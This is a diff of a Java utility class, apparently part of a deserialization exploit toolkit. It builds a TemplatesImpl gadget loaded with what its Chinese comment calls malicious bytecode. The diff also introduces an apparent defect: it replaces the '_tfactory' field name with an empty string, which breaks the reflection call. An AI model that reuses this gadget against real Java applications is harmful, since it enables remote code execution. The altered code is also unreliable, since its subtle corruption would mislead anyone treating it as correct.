@@ -1,7 +1,6 @@
 package Seri;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
@@ -13,6 +12,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import java.util.Base64;
 
 public class Utils {
@@ -50,7 +50,7 @@ public class Utils {
         setValue(templates,"_name","aaa");
         // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
         setValue(templates,"_bytecodes",new byte[][]{bytes});
-        setValue(templates,"_tfactory",new TransformerFactoryImpl());
+        setValue(templates,"",new TransformerFactoryImpl());
 
         return templates;
     }
